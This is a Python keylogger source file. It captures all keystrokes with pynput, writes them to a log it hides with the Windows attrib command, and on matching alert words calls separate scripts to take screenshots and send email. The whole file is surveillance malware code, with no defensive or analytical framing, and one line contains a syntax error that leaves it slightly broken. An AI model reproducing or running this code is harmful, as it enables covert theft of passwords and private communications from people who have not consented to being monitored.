#!/usr/bin/python
#pynput
# %(asctime)s: 
from pynput.keyboard import Key, Listener
#import logging
from subprocess import call
import subprocess
from getsqldata import *


# create file log
try:
    f = open('./key_log.txt', 'x')
    f.close()
except :
    pass
#hidden file log
file = './key_log.txt' #or full path if not in same directory
subprocess.check_call(["attrib","+H",file],shell=True)
#logfile = open('./key_log.txt', 'a+', encoding='utf-8')
#logging.basicConfig(stream = logfile, level=logging.DEBUG, format=u'%(message)s')
#iBack = 0
word = u''
winText = ''
listBreakWord = ["Key.enter","Key.space"]
listSpecialKey = ["Key.tab","Key.caps_lock","Key.shift",
                  "Key.ctrl_l","Key.cmd","Key.alt_l","Key.alt_r",
                  "Key.print_screen","Key.ctrl_r","Key.page_up",
                  "Key.page_down","Key.up","Key.down","Key.left",
                  "Key.right","Key.shift_r","Key.home","Key.insert",
                  "Key.end","Key.esc","Key.delete"]#,"Key.backspace"]
uid = getCurrentUser():

def alerts(alertList, word):
    conf = getRowValue("Alerts",uid)
    word = word.strip() #remove last character like space \t \n \r
    if(word in alertList):
        if conf[2] == 1:
            call("python screenshot.py", shell=True)
            print("Alert - screenshot successful")
        if conf[1] == 1:
            call("python email.py", shell=True)
            print("Alert - send email successful")
'''
def target(uid, activeWindows):
    conf = getRowValue("Targets",uid)
    result = 0
    if conf[1] == 1: # all app
        return True
    if conf[2] == 1: # following app
        byName = getColumnValue("byName","TargetList",uid)
        byApp = getColumnValue("byApp","TargetList",uid)
        print(byName)
        print(byApp)
        for name in byName:
            print(name.lower(), activeWindows.lower())
            if activeWindows.lower().find(name.lower()) > -1 :
                return True
        for app in byApp:
            print(app.lower(), activeWindows.lower())
            if app.lower() == activeWindows.lower():
                return True
    print("false")
    return False
'''

def on_press(key):
    global word,iBack
    #logging.info(key)
    ch = u''
    
    if(str(key) not in listSpecialKey):
        ch = str(key).replace("'","")
        
    if(str(key) == "Key.enter"):
        ch = '\n'
    if(str(key) == "Key.space"):
        ch = ' '
    
    word += ch
    pos = 0

    print("word : " +word+"\tch : " +ch)
    #English
    if(str(key)=="Key.backspace"):
        pos = word.find("Key.backspace")
        word = word[:(pos-1)]
    
    ''' #Vietnamese
    if(str(key) == "Key.backspace" ):
        iBack = iBack + 1
        pos = word.find("Key.backspace")
        if (iBack == 1):
            word = word[:(pos-2)]
            #print("if 1 :word : " + word + "\t iBack : " + str(iBack))
        elif(iBack > 1):
            word  = word[:(pos-1)]
            #print("if 2 :word : " + word + "\t iBack : " + str(iBack))
    else:
        iBack = 0
     '''   
    if(str(key) in listBreakWord):
        listKey = getColumnValue("key","AlertList",1)
        #print("word : " + word + "\t list : " + str(listKey))
        with open('./key_log.txt', 'a', encoding='utf-8') as f:
            f.write(word)
        
        alerts(listKey,word)
        word = u''
        #iBack = 0
        '''
w = win32gui
winText = w.GetWindowText(w.GetForegroundWindow())
if target(1,winText):
'''
with Listener(on_press=on_press) as listener:
    listener.join()

